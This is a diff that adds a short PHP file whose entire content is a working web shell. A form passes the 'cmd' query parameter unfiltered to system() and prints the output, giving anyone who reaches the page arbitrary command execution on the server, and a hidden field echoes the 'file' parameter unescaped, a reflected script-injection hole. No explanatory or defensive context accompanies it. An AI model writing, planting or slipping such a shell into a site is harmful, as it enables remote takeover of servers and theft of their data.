@@ -1,0 +1,20 @@
+<html>
+<body>
+<form method="get" action="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="text" name="cmd" autofocus id="cmd" size="80">
+<input type="hidden" name="file" value="<?php echo $_GET["file"] ?>">
+<input type="submit" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+<?php
+exit(1);
+?>
